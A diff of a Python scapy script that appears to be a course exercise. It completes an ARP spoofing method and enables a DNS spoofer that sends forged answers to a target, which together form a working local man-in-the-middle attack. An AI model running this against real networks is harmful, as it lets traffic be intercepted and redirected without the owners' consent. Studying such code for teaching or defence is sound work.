@@ -60,11 +60,16 @@ class ArpSpoofer(object):
 
     def spoof(self) -> None:
         """
-        Sends an ARP spoof that convinces target_ip that we are spoof_ip.
+        Sends an ARP spoof that #convinces target_ip that we are spoof_ip.
         Increases spoof count b y one.
         """
 
-        # Your code here...
+        target_mac = self.get_target_mac()
+        arp_response = ARP(pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip, op='is-at')
+        sendp(arp_response, verbose=0)
+        if True:
+            self_mac = ARP().hwsrc
+            print("[+] Sent to {} : {} is-at {}".format(self.target_ip, self.spoof_ip, self_mac))
 
         self.spoof_count += 1
 
@@ -128,7 +133,8 @@ class DnsHandler(object):
         resp_pkt = IP(dst=pkt[IP].src, src=SECRATERY_IP) / UDP(dport=pkt[UDP].sport) / DNS()
         resp_pkt[DNS] = response[DNS]
         return resp_pkt
-#        send(resp_pkt, verbose=0)
+
+    #        send(resp_pkt, verbose=0)
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
@@ -193,12 +199,12 @@ class DnsHandler(object):
         @return DNS response to packet
         """
         print("start resolve_packet")
-        print("qname - ",pkt[DNSQR].qname)
+        print("qname - ", pkt[DNSQR].qname)
         if pkt[DNSQR].qname in self.spoof_dict:
             response_packet = self.get_spoofed_dns_response(pkt, SPOOF_DICT[pkt[DNSQR].qname])
         else:
             response_packet = self.get_real_dns_response(pkt)
-        #sendp(response_packet, iface=IFACE)
+        # sendp(response_packet, iface=IFACE)
         return response_packet
 
     def run(self) -> None:
@@ -224,9 +230,8 @@ class DnsHandler(object):
 if __name__ == "__main__":
     plist = []
     spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
-    print(spoofer.get_target_mac())
-    # server = DnsHandler(plist, SPOOF_DICT)
+    server = DnsHandler(plist, SPOOF_DICT)
 
-    # print("Starting sub-processes...")
-    # server.start()
-    # spoofer.start()
+    print("Starting sub-processes...")
+    server.start()
+    spoofer.start()
